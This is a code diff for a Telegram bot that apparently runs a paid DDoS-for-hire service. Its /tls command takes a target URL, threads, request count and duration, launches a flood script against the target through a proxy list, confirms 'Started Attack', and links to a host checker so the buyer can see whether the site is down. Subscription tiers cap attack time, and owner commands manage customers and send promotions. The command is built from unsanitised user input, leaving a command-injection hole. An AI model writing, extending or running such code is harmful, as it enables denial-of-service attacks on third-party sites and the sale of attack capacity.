@@ -1,0 +1,156 @@
+// Command '/tls'
+bot.onText(/\/tls (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    const args = match[1].trim().split(' ');
+
+    // Check for correct number of arguments
+    if (args.length !== 4) {
+        return bot.sendMessage(chatId, "🔧 Please Usage: /tls <url> <thread> <req> <time>");
+    }
+
+    const [url, thread, req, time] = args;
+
+    // Validate arguments
+    if (isNaN(thread) || isNaN(req) || isNaN(time)) {
+        return bot.sendMessage(chatId, "❌ All parameters except for URL must be numbers: <url> <thread> <req> <time>");
+    }
+
+    // Check user plan and max time remain
+    const userPlan = plans[chatId].plan;
+    let maxTimeAllowed;
+
+    switch (userPlan) {
+        case 'vip':
+            maxTimeAllowed = 460;
+            break;
+        case 'basic':
+            maxTimeAllowed = 320;
+            break;
+        case 'member':
+            maxTimeAllowed = 120;
+            break;
+        default:
+            return bot.sendMessage(chatId, '❌ You do not have a valid plan.');
+    }
+
+    // Check if user has enough time if not the owner
+    if (plans[chatId].maxTime < time && !isOwner(chatId)) {
+        return bot.sendMessage(chatId, `❌ You cannot use more time than your allowance.`);
+    }
+
+    // Execute the attack script
+    exec(`node ./lib/tls.js ${url} ${thread} ${req} ${time} proxy.txt`, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`exec error: ${error}`);
+            return bot.sendMessage(chatId, "❌ There was an error executing the attack. Please check the parameters.");
+        }
+        bot.sendMessage(chatId, `✅ <> Started Attack On ${url} For ${time} Seconds <>`, {
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '➡️ Check Host', url: `https://check-host.net/check-http?host=${url}&csrf_token=` }]
+                ]
+            }
+        });
+    });
+
+    // Update maxTime if the user is not the owner
+    if (!isOwner(chatId)) {
+        plans[chatId].maxTime -= time;
+        fs.writeFileSync('plans.json', JSON.stringify(plans));
+    }
+});
+
+// Command '/addplans'
+bot.onText(/\/addplans (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+
+    if (!isOwner(chatId)) {
+        return bot.sendMessage(chatId, '❌ You are not the owner of the bot.');
+    }
+
+    const args = match[1].trim().split(' ');
+
+    if (args.length !== 3) {
+        return bot.sendMessage(chatId, "😄 Please Usage: /addplans <id> <type> <duration>\n🔧 Example: /addplans 718218 vip 1Week");
+    }
+
+    const [id, type, duration] = args;
+
+    if (!['vip', 'basic', 'member'].includes(type)) {
+        return bot.sendMessage(chatId, "❌ Invalid plan type. Must be 'vip', 'basic', or 'member'.");
+    }
+
+    // Update plans.json with new plan data
+    plans[id] = { plan: type, maxTime: duration === '1Year' ? 460 : duration === '1Month' ? 320 : 120, referralCount: 0 };
+    fs.writeFileSync('plans.json', JSON.stringify(plans));
+
+    bot.sendMessage(chatId, `✅ Successfully added user ${id} to plans as ${type} for ${duration}.`);
+});
+
+// Command '/ban'
+bot.onText(/\/ban (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    const userIdToBan = match[1].trim(); // Get the user ID from the command
+
+    if (!isOwner(chatId)) {
+        return bot.sendMessage(chatId, '❌ You are not the owner of the bot.');
+    }
+
+    if (!userIdToBan) {
+        return bot.sendMessage(chatId, "❌ Please provide a valid user ID to ban.\n🔧 Usage: /ban <user_id>");
+    }
+
+    // Delete the user from plans.json or mark them as banned
+    if (plans[userIdToBan]) {
+        delete plans[userIdToBan];  // Remove user plan if banning them
+        fs.writeFileSync('plans.json', JSON.stringify(plans));
+        bot.sendMessage(chatId, `✅ User with ID ${userIdToBan} has been banned successfully.`);
+    } else {
+        bot.sendMessage(chatId, `❌ No user found with ID ${userIdToBan}.`);
+    }
+});
+
+// Command '/delplans'
+bot.onText(/\/delplans (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    const userIdToDelete = match[1].trim(); // Get the user ID from the command
+
+    if (!isOwner(chatId)) {
+        return bot.sendMessage(chatId, '❌ You are not the owner of the bot.');
+    }
+
+    if (!userIdToDelete) {
+        return bot.sendMessage(chatId, "❌ Please provide a valid user ID to delete plans.\n🔧 Usage: /delplans <user_id>");
+    }
+
+    // Check for user plan and delete if exists
+    if (plans[userIdToDelete]) {
+        delete plans[userIdToDelete]; // Remove user plan
+        fs.writeFileSync('plans.json', JSON.stringify(plans));
+        bot.sendMessage(chatId, `✅ Plans for user ID ${userIdToDelete} have been deleted successfully.`);
+    } else {
+        bot.sendMessage(chatId, `❌ No plans found for user ID ${userIdToDelete}.`);
+    }
+});
+
+// Command '/qc'
+bot.onText(/\/qc (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    const promotionMessage = match[1]; // Get the promotion message
+
+    if (!isOwner(chatId)) {
+        return bot.sendMessage(chatId, '❌ You are not the owner of the bot.');
+    }
+
+    if (!promotionMessage) {
+        return bot.sendMessage(chatId, "❌ Please provide a promotion message to send.\n🔧 Usage: /qc <message>");
+    }
+
+    // Iterate through all users and send the promotion message
+    Object.keys(plans).forEach(userId => {
+        bot.sendMessage(userId, promotionMessage)
+            .catch(error => console.error(`Could not send message to ${userId}:`, error));
+    });
+
+    bot.sendMessage(chatId, `✅ Promotion message has been sent to all users.`);
+});
